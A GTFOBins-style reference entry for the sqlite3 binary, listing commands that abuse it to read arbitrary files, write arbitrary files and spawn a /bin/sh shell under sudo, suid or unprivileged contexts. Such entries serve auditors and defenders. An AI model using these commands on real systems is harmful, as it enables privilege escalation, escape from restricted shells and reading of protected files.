---
type: gtfobin
name: sqlite3
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# sqlite3

## file-read

```bash
sqlite3 <<EOF
CREATE TABLE x(x TEXT);
.import /path/to/input-file x
SELECT * FROM x;
EOF
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
sqlite3 /dev/null '.shell /bin/sh'
```
**Contexts:** sudo, suid, unprivileged
